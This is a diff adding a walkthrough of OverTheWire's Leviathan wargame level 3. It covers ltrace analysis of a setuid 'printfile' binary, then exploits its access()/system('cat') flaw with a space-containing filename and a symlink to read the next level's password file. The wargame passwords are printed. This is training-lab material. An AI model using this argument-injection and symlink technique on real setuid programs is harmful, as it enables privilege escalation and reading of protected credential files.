@@ -98,4 +98,44 @@ ougahZi8Ta
 ### [Level 3](http://overthewire.org/wargames/leviathan/leviathan3.html)
 ```sh
 $ sshpass -p 'ougahZi8Ta' ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+
+leviathan2@leviathan:~$ ls -la
+total 28
+drwxr-xr-x  2 root       root       4096 Aug 26 22:26 .
+drwxr-xr-x 10 root       root       4096 Aug 26 22:26 ..
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26 22:26 printfile
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
 ```
+
+Take a look on the `ltrace` output.
+```
+leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
+__libc_start_main(0x804852b, 2, 0xffffd674, 0x8048610 <unfinished ...>
+access("/etc/leviathan_pass/leviathan2", 4)                                                                          = 0
+snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                = 39
+geteuid()                                                                                                            = 12002
+geteuid()                                                                                                            = 12002
+setreuid(12002, 12002)                                                                                               = 0
+system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                               = 0
++++ exited (status 0) +++
+```
+
+To get a leviathan3 flag I did the following steps. 
+```
+$ mkdir -p    /tmp/leviathan_lu
+$ touch       /tmp/leviathan_lu/file\ level3
+$ ls -la      /tmp/leviathan_lu/
+$ ln -s       /etc/leviathan_pass/leviathan3 /tmp/leviathan_lu/file
+$ ls -la      /tmp/leviathan_lu/
+$ ltrace      ./printfile "/tmp/leviathan_lu/file level3"
+
+leviathan2@leviathan:~$ ./printfile "/tmp/leviathan_lu/file level3"
+Ahdiemoo1j
+/bin/cat: level3: No such file or directory
+```
+``` FLAG: Ahdiemoo1j```
